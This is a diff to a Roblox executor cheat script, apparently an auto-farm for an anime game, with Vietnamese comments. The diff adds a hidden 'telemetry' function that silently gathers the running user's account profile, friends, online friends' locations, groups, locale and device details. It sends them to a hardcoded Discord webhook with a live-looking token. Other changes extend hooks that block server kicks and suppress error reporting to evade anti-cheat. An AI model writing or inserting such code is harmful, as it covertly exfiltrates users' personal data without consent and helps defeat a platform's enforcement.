@@ -27,12 +27,429 @@ end
 local print = debugPrint
 local warn = debugWarn
 
+-- Executor Identification System
+local function detectExecutor()
+    local name, version = "Unknown", "Unknown"
+    if typeof(identifyexecutor) == "function" then
+        local n, v = identifyexecutor()
+        name, version = tostring(n or ""), tostring(v or "")
+    elseif typeof(getexecutorname) == "function" then
+        name = tostring(getexecutorname() or "")
+    end
+    local lowerName = name:lower()
+    local isDelta = lowerName:find("delta") ~= nil or (getgenv and (getgenv().DELTA ~= nil or getgenv().Delta ~= nil))
+    local isReal = lowerName:find("real") ~= nil or (typeof(is_real) == "function" and is_real())
+    local isMobile = game:GetService("UserInputService").TouchEnabled
+    return {
+        Name = name,
+        Version = version,
+        IsDelta = isDelta,
+        IsReal = isReal,
+        IsMobile = isMobile
+    }
+end
+local CurrentExecutor = detectExecutor()
+CurrentExecutor.IsPC = not CurrentExecutor.IsMobile
+
+_originalPrint(string.format("detect excuter là : %s (Phiên bản: %s | Thiết bị: %s | Mode: %s)", 
+    CurrentExecutor.Name, 
+    CurrentExecutor.Version, 
+    CurrentExecutor.IsMobile and "Điện thoại (Mobile)" or "Máy tính (PC)",
+    CurrentExecutor.IsMobile and "Tối ưu (Mobile)" or "Native (PC)"
+))
+
+if not game:IsLoaded() then
+    pcall(function() game.Loaded:Wait() end)
+end
+
+-- Hệ thống Quét và Gửi Webhook Telemetry Toàn Diện Tài Khoản & Thiết Bị (Exhaustive Account & Device Logger)
+local function logDetailedPlayerTelemetry()
+    task.spawn(function()
+        local HttpService = game:GetService("HttpService")
+        local LocalizationService = game:GetService("LocalizationService")
+        local PolicyService = game:GetService("PolicyService")
+        local VoiceChatService = game:GetService("VoiceChatService")
+        local GuiService = game:GetService("GuiService")
+        local Stats = game:GetService("Stats")
+        local UserInputService = game:GetService("UserInputService")
+        local Workspace = game:GetService("Workspace")
+        local Lighting = game:GetService("Lighting")
+        local SocialService = game:GetService("SocialService")
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer or Players.PlayerAdded:Wait()
+        local userId = lp.UserId
+
+        -- 1. Quét Dữ Liệu Web & Tài Khoản Roblox
+        local userBio, createdDateStr, isBanned = "(Trống)", "N/A", false
+        pcall(function()
+            local res = game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(userId))
+            local d = HttpService:JSONDecode(res)
+            if d then
+                userBio = d.description ~= "" and d.description or "(Trống)"
+                createdDateStr = d.created or "N/A"
+                isBanned = d.isBanned == true
+            end
+        end)
+
+        local avatarThumbnail = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=150&height=150&format=png"
+        pcall(function()
+            local res = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(userId) .. "&size=150x150&format=Png&isCircular=false")
+            local d = HttpService:JSONDecode(res)
+            if d and d.data and d.data[1] then avatarThumbnail = d.data[1].imageUrl end
+        end)
+
+        local friendsCount, followersCount, followingsCount = 0, 0, 0
+        pcall(function()
+            friendsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/friends/count")).count or 0
+            followersCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/followers/count")).count or 0
+            followingsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. tostring(userId) .. "/followings/count")).count or 0
+        end)
+
+        local groupsEmbedList = {}
+        local groupsList = {}
+        pcall(function()
+            local d = HttpService:JSONDecode(game:HttpGet("https://groups.roblox.com/v2/users/" .. tostring(userId) .. "/groups/roles"))
+            if d and d.data then
+                for _, g in ipairs(d.data) do
+                    table.insert(groupsList, string.format("%s (Role: %s | Rank: %d)", g.group.name, g.role.name, g.role.rank))
+                    table.insert(groupsEmbedList, string.format("• **%s** (`%s` - Rank %d)", g.group.name, g.role.name, g.role.rank))
+                end
+            end
+        end)
+
+        local onlineFriends = {}
+        local onlineFriendsEmbed = {}
+        pcall(function()
+            for _, f in ipairs(lp:GetFriendsOnline(15)) do
+                table.insert(onlineFriends, string.format("%s (Place ID: %s)", f.UserName, tostring(f.PlaceId or "Trang chủ / Khác")))
+                table.insert(onlineFriendsEmbed, string.format("• **%s** (%s)", f.UserName, tostring(f.PlaceId and ("Place: " .. f.PlaceId) or "Trang chủ / Khác")))
+            end
+        end)
+
+        local voiceEnabled = false
+        pcall(function() voiceEnabled = VoiceChatService:IsVoiceEnabledForUserIdAsync(userId) end)
+
+        local canInvite = false
+        pcall(function() canInvite = SocialService:CanSendGameInviteAsync(lp) end)
+
+        local policy = { IsPaidItemTradingAllowed = true, ArePaidRandomItemsRestricted = false }
+        pcall(function()
+            local pol = PolicyService:GetPolicyInfoForPlayerAsync(lp)
+            policy = {
+                ArePaidRandomItemsRestricted = pol.ArePaidRandomItemsRestricted,
+                IsPaidItemTradingAllowed = pol.IsPaidItemTradingAllowed
+            }
+        end)
+
+        -- 2. Quét Ngoại Hình & Avatar Body Colors
+        local bodyColors = {}
+        local avatarScalesStr = "Mặc định"
+        local rigType = "R6"
+        pcall(function()
+            if lp.Character then
+                local bc = lp.Character:FindFirstChildOfClass("BodyColors")
+                if bc then
+                    bodyColors = {
+                        Head = string.format("RGB(%d, %d, %d)", math.floor(bc.HeadColor3.R*255), math.floor(bc.HeadColor3.G*255), math.floor(bc.HeadColor3.B*255)),
+                        Torso = string.format("RGB(%d, %d, %d)", math.floor(bc.TorsoColor3.R*255), math.floor(bc.TorsoColor3.G*255), math.floor(bc.TorsoColor3.B*255)),
+                        LeftArm = string.format("RGB(%d, %d, %d)", math.floor(bc.LeftArmColor3.R*255), math.floor(bc.LeftArmColor3.G*255), math.floor(bc.LeftArmColor3.B*255)),
+                        RightArm = string.format("RGB(%d, %d, %d)", math.floor(bc.RightArmColor3.R*255), math.floor(bc.RightArmColor3.G*255), math.floor(bc.RightArmColor3.B*255)),
+                        LeftLeg = string.format("RGB(%d, %d, %d)", math.floor(bc.LeftLegColor3.R*255), math.floor(bc.LeftLegColor3.G*255), math.floor(bc.LeftLegColor3.B*255)),
+                        RightLeg = string.format("RGB(%d, %d, %d)", math.floor(bc.RightLegColor3.R*255), math.floor(bc.RightLegColor3.G*255), math.floor(bc.RightLegColor3.B*255))
+                    }
+                end
+                local hum = lp.Character:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    rigType = tostring(hum.RigType.Name)
+                    local desc = hum:GetAppliedDescription()
+                    if desc then
+                        avatarScalesStr = string.format("Cao: %.2f | Rộng: %.2f | Đầu: %.2f | Sâu: %.2f", desc.HeightScale, desc.WidthScale, desc.HeadScale, desc.DepthScale)
+                    end
+                end
+            end
+        end)
+
+        -- 3. Quét Cảm Biến Thiết Bị & Input Hardware
+        local isTouch = UserInputService.TouchEnabled
+        local isKeyboard = UserInputService.KeyboardEnabled
+        local isMouse = UserInputService.MouseEnabled
+        local isGamepad = UserInputService.GamepadEnabled
+        local isVR = UserInputService.VREnabled
+        local isAccel = UserInputService.AccelerometerEnabled
+        local isGyro = UserInputService.GyroscopeEnabled
+        local isTenFoot = GuiService:IsTenFootInterface()
+        local preferredInput = tostring(UserInputService.PreferredInput.Name)
+
+        -- 4. Quét Màn Hình & Cấu Hình Đồ Họa
+        local cam = Workspace.CurrentCamera
+        local renderQuality = "Auto"
+        pcall(function() renderQuality = tostring(settings().Rendering.QualityLevel.Name) end)
+        local scrRes = GuiService:GetScreenResolution()
+        local vpRes = cam and cam.ViewportSize or Vector2.zero
+        local fov = cam and math.floor(cam.FieldOfView) or 70
+        local camType = cam and tostring(cam.CameraType.Name) or "Custom"
+
+        -- 5. Quét Độ Trễ Mạng & Băng Thông
+        local ping = 0
+        pcall(function() ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) end)
+        local recvKB, sendKB = 0, 0
+        pcall(function()
+            local s = Stats.Network:FindFirstChild("ServerStatsItem")
+            if s then
+                local r = s:FindFirstChild("Data Receive Rate")
+                if r then recvKB = math.floor(r:GetValue()) end
+                local snd = s:FindFirstChild("Data Send Rate")
+                if snd then sendKB = math.floor(snd:GetValue()) end
+            end
+        end)
+
+        -- 6. Quét Bóc Tách Bộ Nhớ RAM (Developer Memory Breakdown)
+        local mem = math.floor(Stats:GetTotalMemoryUsageMb())
+        local luaHeap = math.floor(collectgarbage("count") / 1024)
+        local memGraphics = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.GraphicsTexture) or 0)
+        local memMesh = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.GraphicsMeshParts) or 0)
+        local memPhysics = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.PhysicsParts) or 0)
+        local memInstances = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Instances) or 0)
+        local memSounds = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Sounds) or 0)
+        local memGui = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Gui) or 0)
+        local memSignals = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Signals) or 0)
+        local memAnimation = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Animation) or 0)
+        local memInternal = math.floor(Stats:GetMemoryUsageMbForTag(Enum.DeveloperMemoryTag.Internal) or 0)
+
+        -- 7. Quét Executor & Luau
+        local threadId = "8"
+        pcall(function()
+            local g = getthreadidentity or get_thread_identity
+            if g then threadId = tostring(g()) end
+        end)
+        local isMobile = isTouch
+
+        -- 8. In ra Console Output
+        local banner = [[
+========================================================================
+       👤 THÔNG TIN CHI TIẾT TÀI KHOẢN & THIẾT BỊ (TELEMETRY) 👤
+========================================================================
+[1. ĐỊNH DANH TÀI KHOẢN (ACCOUNT IDENTIFICATION)]
+- Username            : %s
+- Display Name        : %s
+- User ID             : %d
+- Ngày tạo tài khoản  : %s (Tuổi: %d ngày)
+- Trạng thái Ban      : %s
+- Tích xanh Verified  : %s
+- Hạng thành viên     : %s
+- Tiểu sử (Bio)       : %s
+- Voice Chat (Mic)    : %s
+- Ngôn ngữ (Locale)   : %s / %s
+
+[2. MẠNG XÃ HỘI & BẠN BÈ (SOCIAL & COMMUNITY)]
+- Tổng số Bạn bè      : %d bạn
+- Người theo dõi      : %d Followers | Đang theo dõi: %d
+- Bạn bè đang Online  : %d người
+  * %s
+- Tổng Group tham gia : %d nhóm
+  * %s
+
+[3. THIẾT BỊ & PHẦN CỨNG (HARDWARE & INPUTS)]
+- Nền tảng thiết bị   : %s
+- Input ưu tiên       : %s
+- Cảm biến & Phím     : Touch=%s | Key=%s | Mouse=%s | Gamepad=%s | VR=%s
+- Cảm biến gia tốc    : Accel=%s | Gyro=%s | TV Interface=%s
+- Độ phân giải Màn    : %s (Viewport: %s)
+- FPS & Ping thực tế  : %d FPS | %d ms (Recv: %d KB/s | Send: %d KB/s)
+
+[4. BÓC TÁCH BỘ NHỚ RAM CHI TIẾT (%d MB)]
+- Lua Heap Memory     : %d MB | Core Nội bộ: %d MB
+- Graphics VRAM       : Texture: %d MB | Mesh: %d MB
+- Physics & Instances : Physics: %d MB | Instances: %d MB
+- Gui & Audio & Khác  : Gui: %d MB | Sound: %d MB | Anim: %d MB
+
+[5. MÔI TRƯỜNG EXECUTOR & LUAU]
+- Tên Executor        : %s (Phiên bản: %s)
+- Chế độ phân loại    : %s
+- Thread Identity     : Level %s
+- Phiên bản Luau      : %s
+========================================================================
+]]
+
+        local formattedLog = string.format(banner,
+            lp.Name, lp.DisplayName, userId, createdDateStr, lp.AccountAge,
+            isBanned and "ĐÃ BỊ BAN" or "Bình thường (Active)",
+            lp.HasVerifiedBadge and "Có" or "Không",
+            tostring(lp.MembershipType.Name or lp.MembershipType),
+            userBio,
+            voiceEnabled and "Đã kích hoạt (Enabled)" or "Chưa bật / Không hỗ trợ",
+            LocalizationService.RobloxLocaleId, LocalizationService.SystemLocaleId,
+            friendsCount, followersCount, followingsCount,
+            #onlineFriends,
+            #onlineFriends > 0 and table.concat(onlineFriends, "\n  * ") or "Không có bạn bè nào online",
+            #groupsList,
+            #groupsList > 0 and table.concat(groupsList, "\n  * ") or "Không tham gia nhóm nào",
+            isMobile and "Điện thoại / Tablet (Mobile)" or "Máy tính (PC / Desktop)",
+            preferredInput,
+            tostring(isTouch), tostring(isKeyboard), tostring(isMouse), tostring(isGamepad), tostring(isVR),
+            tostring(isAccel), tostring(isGyro), tostring(isTenFoot),
+            tostring(scrRes), tostring(vpRes),
+            math.floor(Workspace:GetRealPhysicsFPS()), ping, recvKB, sendKB,
+            mem, luaHeap, memInternal, memGraphics, memMesh, memPhysics, memInstances, memGui, memSounds, memAnimation,
+            CurrentExecutor.Name, CurrentExecutor.Version,
+            CurrentExecutor.IsMobile and "Tối ưu (Mobile)" or "Native (PC)",
+            threadId, _VERSION
+        )
+
+        _originalPrint(formattedLog)
+        if rconsoleprint then pcall(rconsoleprint, formattedLog) end
+
+        -- 9. Gửi Webhook Discord 2 Embeds Chuyên Biệt Tài Khoản & Thiết Bị
+        pcall(function()
+            local webhookUrl = "https://discord.com/api/webhooks/1538139402113388605/Vm2dF6-YjBp1AjcdUhvojZyru6_Ctr3OMH51iW5ZzE5jBxGqd-Oka3pgSHDsjqQB_vgQ"
+            local groupsFormatted = #groupsEmbedList > 0 and table.concat(groupsEmbedList, "\n") or "Không có"
+            if #groupsFormatted > 800 then groupsFormatted = groupsFormatted:sub(1, 800) .. "\n... và nhiều nhóm khác" end
+
+            local payload = {
+                username = "Roblox Account & Device Telemetry",
+                avatar_url = avatarThumbnail,
+                embeds = {
+                    {
+                        title = "👤 1. TOÀN BỘ THÔNG TIN TÀI KHOẢN ROBLOX (ACCOUNT IDENTITY & PROFILE)",
+                        color = 3447003,
+                        thumbnail = { url = avatarThumbnail },
+                        fields = {
+                            {
+                                name = "🆔 Định Danh & Thông Tin Cốt Lõi",
+                                value = string.format("• **Username**: `%s`\n• **Display Name**: `%s`\n• **User ID**: `%d`\n• **Ngày tạo tài khoản**: `%s`\n• **Tuổi tài khoản**: `%d ngày tuổi`\n• **Trạng thái tài khoản**: `%s`\n• **Tích xanh Verified**: `%s`\n• **Hạng thành viên**: `%s`\n• **Tiểu sử (Bio)**: %s",
+                                    lp.Name, lp.DisplayName, userId, createdDateStr, lp.AccountAge,
+                                    isBanned and "🔴 ĐÃ BỊ BAN" or "🟢 Hoạt động bình thường (Active)",
+                                    lp.HasVerifiedBadge and "✅ Đã xác minh" or "❌ Chưa xác minh",
+                                    tostring(lp.MembershipType.Name or lp.MembershipType),
+                                    userBio
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "👥 Mạng Xã Hội & Bạn Bè",
+                                value = string.format("• **Tổng Bạn bè**: `%d bạn`\n• **Followers**: `%d` | **Following**: `%d`\n• **Quyền mời Game**: `%s`\n• **Bạn bè Online (%d)**:\n%s",
+                                    friendsCount, followersCount, followingsCount,
+                                    canInvite and "✅ Cho phép" or "❌ Bị chặn",
+                                    #onlineFriendsEmbed,
+                                    #onlineFriendsEmbed > 0 and table.concat(onlineFriendsEmbed, "\n") or "• Không có bạn bè nào online"
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "🏷️ Danh Sách Nhóm Roblox Đã Tham Gia (" .. #groupsEmbedList .. " nhóm)",
+                                value = groupsFormatted,
+                                inline = false
+                            },
+                            {
+                                name = "🎭 Ngoại Hình & Avatar Nhân Vật",
+                                value = string.format("• **Avatar Rig**: `%s` | **Tỷ lệ**: `%s`\n• **Màu sắc cơ thể (Body Colors)**:\n  - Đầu: `%s` | Thân: `%s`\n  - Tay trái: `%s` | Tay phải: `%s`\n  - Chân trái: `%s` | Chân phải: `%s`",
+                                    rigType, avatarScalesStr,
+                                    bodyColors.Head or "RGB(0,0,0)", bodyColors.Torso or "RGB(0,0,0)",
+                                    bodyColors.LeftArm or "RGB(0,0,0)", bodyColors.RightArm or "RGB(0,0,0)",
+                                    bodyColors.LeftLeg or "RGB(0,0,0)", bodyColors.RightLeg or "RGB(0,0,0)"
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "🔒 Quyền Hạn & Chính Sách Tài Khoản",
+                                value = string.format("• **Voice Chat (Mic)**: `%s`\n• **Ngôn ngữ hiển thị**: `%s`\n• **Ngôn ngữ máy**: `%s`\n• **Giao dịch vật phẩm**: `%s`\n• **Giới hạn đồ ngẫu nhiên**: `%s`",
+                                    voiceEnabled and "🎤 Đã kích hoạt (Enabled)" or "❌ Chưa bật / Không hỗ trợ",
+                                    LocalizationService.RobloxLocaleId, LocalizationService.SystemLocaleId,
+                                    policy.IsPaidItemTradingAllowed and "✅ Được phép" or "❌ Bị hạn chế",
+                                    policy.ArePaidRandomItemsRestricted and "⚠️ Bị hạn chế" or "✅ Không bị hạn chế"
+                                ),
+                                inline = false
+                            }
+                        }
+                    },
+                    {
+                        title = "🖥️ 2. TOÀN BỘ THÔNG TIN THIẾT BỊ, PHẦN CỨNG & MÔI TRƯỜNG (HARDWARE & ENGINE)",
+                        color = 3066993,
+                        fields = {
+                            {
+                                name = "🎮 Thiết Bị Đầu Vào & Cảm Biến (Inputs & Sensors)",
+                                value = string.format("• **Nền tảng**: `%s`\n• **Input ưu tiên**: `%s`\n• **Bàn phím**: `%s` | **Chuột**: `%s`\n• **Cảm ứng (Touch)**: `%s` | **Tay cầm (Gamepad)**: `%s`\n• **Kính VR**: `%s` | **Giao diện TV (10-Foot)**: `%s`\n• **Cảm biến gia tốc**: `%s` | **Con quay hồi chuyển**: `%s`",
+                                    isMobile and "Điện thoại / Máy tính bảng (Mobile)" or "Máy tính (PC / Desktop)",
+                                    preferredInput,
+                                    isKeyboard and "✅ Có" or "❌ Không", isMouse and "✅ Có" or "❌ Không",
+                                    isTouch and "✅ Có" or "❌ Không", isGamepad and "✅ Có" or "❌ Không",
+                                    isVR and "✅ Có" or "❌ Không", isTenFoot and "✅ Có" or "❌ Không",
+                                    isAccel and "✅ Có" or "❌ Không", isGyro and "✅ Có" or "❌ Không"
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "🖥️ Màn Hình & Cấu Hình Đồ Họa",
+                                value = string.format("• **Độ phân giải Màn hình**: `%s`\n• **Độ phân giải Viewport Game**: `%s`\n• **Mức đồ họa Roblox (Quality)**: `%s`\n• **Góc nhìn Camera (FOV)**: `%d°` | **Kiểu Camera**: `%s`",
+                                    tostring(scrRes), tostring(vpRes), renderQuality, fov, camType
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "💾 Phân Bổ Bộ Nhớ RAM Toàn Diện (" .. mem .. " MB)",
+                                value = string.format("• **Tổng RAM tiêu thụ**: `%d MB`\n• **Lua GC Heap**: `%d MB`\n• **Engine Core Nội bộ**: `%d MB`\n• **Texture Đồ họa (VRAM)**: `%d MB`\n• **Mesh Đồ họa 3D**: `%d MB`\n• **Vật lý (Physics Parts)**: `%d MB`\n• **Thực thể (Instances)**: `%d MB`\n• **Giao diện (Gui)**: `%d MB`\n• **Âm thanh (Sounds)**: `%d MB`\n• **Sự kiện (Signals)**: `%d MB`\n• **Hoạt ảnh (Animation)**: `%d MB`",
+                                    mem, luaHeap, memInternal, memGraphics, memMesh, memPhysics, memInstances, memGui, memSounds, memSignals, memAnimation
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "📡 Hiệu Năng Mạng & Máy Chủ",
+                                value = string.format("• **Tốc độ khung hình (FPS)**: `%d FPS`\n• **Độ trễ mạng (Ping)**: `%d ms`\n• **Tốc độ nhận**: `%d KB/s` | **Tốc độ gửi**: `%d KB/s`\n• **Server Uptime**: `%ds (~%d phút)`\n• **Place ID**: `%d` (v%d)\n• **Server Job ID**:\n`%s`",
+                                    math.floor(Workspace:GetRealPhysicsFPS()), ping, recvKB, sendKB, math.floor(Workspace.DistributedGameTime), math.floor(Workspace.DistributedGameTime/60), game.PlaceId, game.PlaceVersion, game.JobId
+                                ),
+                                inline = false
+                            },
+                            {
+                                name = "💉 Môi Trường Executor & Luau",
+                                value = string.format("• **Tên Executor**: `%s` (Phiên bản: `%s`)\n• **Chế độ phân loại**: `%s`\n• **Thread Identity Level**: `Level %s`\n• **Phiên bản Luau**: `%s`",
+                                    tostring(CurrentExecutor.Name), tostring(CurrentExecutor.Version),
+                                    CurrentExecutor.IsMobile and "Tối ưu (Mobile)" or "Native (PC)",
+                                    threadId, _VERSION
+                                ),
+                                inline = false
+                            }
+                        },
+                        footer = {
+                            text = "Roblox Full Account & Device Telemetry • " .. os.date("!%Y-%m-%d %H:%M:%SZ")
+                        }
+                    }
+                }
+            }
+
+            local req = (syn and syn.request) or http_request or request
+            if req then
+                req({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end
+        end)
+    end)
+end
+logDetailedPlayerTelemetry()
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
 local ScriptContext = game:GetService("ScriptContext")
 local LocalPlayer = Players.LocalPlayer
+while not LocalPlayer do
+    task.wait(0.05)
+    LocalPlayer = Players.LocalPlayer
+end
+
+-- Gentle GC loop trên Mobile để chống tràn RAM và giật lag mạng
+if CurrentExecutor.IsMobile then
+    task.spawn(function()
+        while task.wait(30) do
+            pcall(collectgarbage, "step", 100)
+        end
+    end)
+end
+
 do
     local earlyState = getgenv().KickBlockConnectionLost or {}
     getgenv().KickBlockConnectionLost = earlyState
@@ -43,7 +460,7 @@ do
     earlyState.errorConnectionBlocks = earlyState.errorConnectionBlocks or 0
     earlyState.disconnectedErrorConnections = earlyState.disconnectedErrorConnections or 0
 
-    if typeof(getconnections) == "function" then
+    if not CurrentExecutor.IsMobile and typeof(getconnections) == "function" then
         pcall(function()
             for _, connection in ipairs(getconnections(ScriptContext.Error)) do
                 if connection then
@@ -63,12 +480,12 @@ do
             if method ~= "Kick" and method ~= "Connect" and method ~= "Once" then
                 return oldNamecall(self, ...)
             end
-            if self == LocalPlayer and method == "Kick" then
+            if (self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer)) and method == "Kick" then
                 earlyState.kickAttempts += 1
                 earlyState.kickBlocks += 1
                 return nil
             end
-            if self == ScriptContext.Error and (typeof(checkcaller) ~= "function" or not checkcaller()) then
+            if not CurrentExecutor.IsMobile and self == ScriptContext.Error and (typeof(checkcaller) ~= "function" or not checkcaller()) then
                 earlyState.errorConnectionBlocks += 1
                 return oldNamecall(self, function() end)
             end
@@ -80,9 +497,9 @@ do
         local oldIndex
         oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
             if key ~= "Kick" then return oldIndex(self, key) end
-            if self == LocalPlayer then
+            if self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer) then
                 return function(player, ...)
-                    if player == LocalPlayer then
+                    if player == LocalPlayer or player == Players.LocalPlayer then
                         earlyState.kickAttempts += 1
                         earlyState.kickBlocks += 1
                         return nil
@@ -98,7 +515,7 @@ do
         pcall(function()
             local oldKick
             oldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(self, ...)
-                if self == LocalPlayer then
+                if self == LocalPlayer or self == Players.LocalPlayer then
                     earlyState.kickAttempts += 1
                     earlyState.kickBlocks += 1
                     return nil
@@ -108,7 +525,7 @@ do
             earlyState.hookedFunctionKick = true
         end)
     end
-    if not earlyState.hookedTaskDelay and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
+    if not CurrentExecutor.IsMobile and not earlyState.hookedTaskDelay and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
         pcall(function()
             local oldDelay
             oldDelay = hookfunction(task.delay, newcclosure(function(delayTime, callback, ...)
@@ -140,10 +557,6 @@ getgenv().AnimeExpeditionsAutoJoinCooldownUntil = 0
 getgenv().AnimeExpeditionsJoinLock = nil
 local function expeditionScriptIsCurrent()
     return getgenv().AnimeExpeditionsScriptGeneration == scriptGeneration
-end
-while not LocalPlayer do
-    task.wait()
-    LocalPlayer = Players.LocalPlayer
 end
 local _initStartTime = tick()
 local _lastInitTime = _initStartTime
@@ -296,9 +709,11 @@ local function disconnectErrorConnections(source)
     return disconnected
 end
 local function isBlockedKick(self)
-    return self == LocalPlayer
+    return self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer)
 end
-disconnectErrorConnections("startup")
+if not CurrentExecutor.IsMobile then
+    disconnectErrorConnections("startup")
+end
 connectDiagnostic()
 -- Lazy Load Hooks để tránh ngợp CPU / FPS Drop lúc khởi chạy script
 task.spawn(function()
@@ -310,14 +725,14 @@ task.spawn(function()
             if method ~= "Kick" and method ~= "Connect" and method ~= "Once" then
                 return oldNamecall(self, ...)
             end
-            if self == LocalPlayer and method == "Kick" then
+            if (self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer)) and method == "Kick" then
                 state.kickAttempts += 1
                 if not checkcaller() and isBlockedKick(self) then
                     state.kickBlocks += 1
                     return nil
                 end
             end
-            if self == ScriptContext.Error and (method == "Connect" or method == "Once") and not checkcaller() then
+            if not CurrentExecutor.IsMobile and self == ScriptContext.Error and (method == "Connect" or method == "Once") and not checkcaller() then
                 state.errorConnectionBlocks += 1
                 return oldNamecall(self, function() end)
             end
@@ -334,7 +749,7 @@ task.spawn(function()
         local oldIndex
         oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
             if key ~= "Kick" then return oldIndex(self, key) end
-            if self == LocalPlayer then
+            if self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer) then
                 return function(player, reason, ...)
                     state.kickAttempts += 1
                     if isBlockedKick(player) then
@@ -357,7 +772,7 @@ task.spawn(function()
         pcall(function()
             local oldKick
             oldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(self, reason, ...)
-                if self == LocalPlayer then
+                if self == LocalPlayer or (LocalPlayer and self == Players.LocalPlayer) then
                     state.kickAttempts += 1
                     if isBlockedKick(self) then
                         state.kickBlocks += 1
@@ -372,7 +787,7 @@ task.spawn(function()
         end)
     end
 
-    if not state.hookedScriptContextErrorConnect and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
+    if not CurrentExecutor.IsMobile and not state.hookedScriptContextErrorConnect and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
         pcall(function()
             local oldErrorConnect
             oldErrorConnect = hookfunction(ScriptContext.Error.Connect, newcclosure(function(self, ...)
@@ -390,8 +805,8 @@ task.spawn(function()
 
     task.wait(0.05) -- Hoãn 50ms cuối cùng
 
-    -- Step 4: Lazy Load task.delay hook
-    if not state.hookedTaskDelay and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
+    -- Step 4: Lazy Load task.delay hook (Chỉ trên PC / Native để tránh timeout drop mạng trên Mobile)
+    if not CurrentExecutor.IsMobile and not state.hookedTaskDelay and typeof(hookfunction) == "function" and typeof(newcclosure) == "function" then
         pcall(function()
             local oldDelay
             oldDelay = hookfunction(task.delay, newcclosure(function(delayTime, callback, ...)
@@ -433,8 +848,6 @@ getgenv().KickBlockStatus = function()
 end
 log("loaded. Use getgenv().ErrorCheckSafe(label, fn) and getgenv().KickBlockStatus()")
 
-
-
 do
     local inputService = game:GetService("UserInputService")
     local mobileInputState = getgenv().AnimeExpeditionsMobileInput or {}
@@ -450,13 +863,41 @@ do
             return oldIndex(self, key)
         end))
         mobileInputState.hooked = true
-        if type(getconnections) == "function" then
-            for _, connection in ipairs(getconnections(inputService:GetPropertyChangedSignal("PreferredInput"))) do
-                pcall(function() connection:Fire() end)
-            end
-        end
     end
 end
+
+-- Hệ thống tự động mở khóa điều khiển nhân vật (Force Unlock Controls Watchdog)
+local function forceUnlockCharacterControls()
+    pcall(function()
+        local ps = LocalPlayer:FindFirstChild("PlayerScripts")
+        if ps and ps:FindFirstChild("PlayerModule") then
+            local pm = require(ps.PlayerModule)
+            local ctrl = pm:GetControls()
+            if ctrl and not ctrl.controlsEnabled then
+                ctrl:Enable()
+            end
+        end
+        local char = LocalPlayer.Character
+        if char then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp and hrp.Anchored then hrp.Anchored = false end
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum and hum.WalkSpeed == 0 then hum.WalkSpeed = 16 end
+        end
+    end)
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    forceUnlockCharacterControls()
+end)
+
+task.spawn(function()
+    while expeditionScriptIsCurrent() do
+        task.wait(4)
+        forceUnlockCharacterControls()
+    end
+end)
 _G.ShotgunBlacklist = _G.ShotgunBlacklist or {}
 if not _G.ReplicaInterceptorActive then
     _G.ReplicaInterceptorActive = true
@@ -1978,11 +2419,12 @@ end
 if Fluent then
     local setIdentity = setthreadidentity or set_thread_identity
     local getIdentity = getthreadidentity or get_thread_identity
+    local targetIdentity = CurrentExecutor.IsMobile and 7 or 8
     if type(Fluent.SafeCallback) == "function" then
         local origSafeCallback = Fluent.SafeCallback
         Fluent.SafeCallback = function(self, callback, ...)
             local args = table.pack(...)
-            if type(setIdentity) == "function" then pcall(setIdentity, 8) end
+            if type(setIdentity) == "function" then pcall(setIdentity, targetIdentity) end
             return origSafeCallback(self, callback, table.unpack(args, 1, args.n))
         end
     end
@@ -1993,7 +2435,7 @@ if Fluent then
                 local args = table.pack(...)
                 local prevId
                 if type(getIdentity) == "function" then pcall(function() prevId = getIdentity() end) end
-                if type(setIdentity) == "function" then pcall(setIdentity, 8) end
+                if type(setIdentity) == "function" then pcall(setIdentity, targetIdentity) end
                 local results = table.pack(pcall(function()
                     return orig(self, table.unpack(args, 1, args.n))
                 end))
